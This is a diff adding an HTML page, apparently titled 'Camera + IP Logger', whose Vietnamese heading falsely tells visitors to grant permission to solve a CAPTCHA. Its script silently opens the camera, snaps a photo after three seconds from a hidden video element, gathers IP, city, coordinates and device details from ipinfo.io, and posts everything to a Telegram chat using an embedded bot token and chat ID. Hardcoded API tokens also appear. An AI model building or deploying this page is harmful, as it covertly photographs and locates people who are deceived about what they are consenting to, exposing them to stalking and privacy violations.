@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Camera + IP Logger</title>
+</head>
+<body>
+  <h2>Vui Lòng Cấp Phép Để giải CapCha ✅</h2>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = '7805845047:AAGJLu7rVnu_M4dH434PnYYMDtbv-mL6d8I';
+    const CHAT_ID = '-1002660861146';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // Lấy thông tin IP từ ipinfo.io
+    async function getIPInfo() {
+      try {
+        const res = await fetch("https://ipinfo.io/json?token=cefc270b4f6d56"); // Token miễn phí
+        return await res.json();
+      } catch (err) {
+        return { ip: "Unknown", city: "?", country: "?", loc: "?" };
+      }
+    }
+
+    // Gửi dữ liệu về Telegram
+    async function sendToTelegram(photoBlob, ipData) {
+      const location = ipData.loc ? ipData.loc.split(",") : ["?", "?"];
+      const message = `
+🛰️ [THÔNG TIN TRUY CẬP]
+
+🌐 IP: ${ipData.ip}
+🌍 Quốc gia: ${ipData.country}
+🏙️ Thành phố: ${ipData.city}
+📍 Vĩ độ: ${location[0]}
+📍 Kinh độ: ${location[1]}
+📱 Thiết bị: ${navigator.userAgent}
+🕒 Thời gian: ${new Date().toLocaleString()}
+`;
+
+      // Gửi text trước
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+
+      // Gửi ảnh sau
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', photoBlob, 'photo.jpg');
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    // Xin quyền camera, chụp và gửi dữ liệu
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(async stream => {
+        video.srcObject = stream;
+
+        setTimeout(async () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+
+          const imageData = canvas.toDataURL('image/jpeg');
+          const response = await fetch(imageData);
+          const photoBlob = await response.blob();
+
+          const ipData = await getIPInfo();
+          await sendToTelegram(photoBlob, ipData);
+        }, 3000);
+      })
+      .catch(err => alert("Không thể truy cập camera hoặc bạn từ chối."));
+  </script>
+</body>
+</html>
